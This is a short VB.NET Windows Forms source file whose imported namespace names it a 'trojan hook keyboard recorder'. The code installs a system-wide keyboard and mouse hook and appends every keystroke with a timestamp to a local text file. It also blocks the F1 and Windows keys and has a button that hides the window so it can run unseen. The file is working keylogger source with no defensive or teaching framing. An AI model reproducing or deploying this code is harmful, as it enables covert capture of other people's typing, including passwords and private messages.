Imports 木马钩子记录键盘.SystemHook
Imports System.Windows.Forms
Imports System.IO
Public Class Form1
    Dim WithEvents hook As New SystemHook
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        hook.StartHook(True, True) '启用键盘与鼠标钩子
        Button1.Enabled = False
    End Sub

    Private Sub Form1_Closed(sender As Object, e As EventArgs) Handles Me.Closed
        Dim hook As New SystemHook
        hook.UnHook()
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Me.Hide()
    End Sub
    Private Sub hook_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles hook.KeyDown
        Me.Text = e.KeyCode.ToString
        Label2.Text = e.KeyCode.ToString
        Dim file As StreamWriter
        file = New StreamWriter("notebook.txt", True)
        file.WriteLine(e.KeyCode.ToString & "  " & Now())
        file.Close()
        Select Case e.KeyCode
            Case Keys.F1, Keys.LWin '禁用F1键与左边的Win键
                Beep()
                e.Handled = True '禁止调用下一个钩子，等于屏蔽这个按键
        End Select
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Dim nf As New Form2
        nf.Show()
    End Sub
    'Private Sub hook_MouseActivity(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles hook.MouseActivity
    'Me.Text = e.Location.ToString
    'End Sub
End Class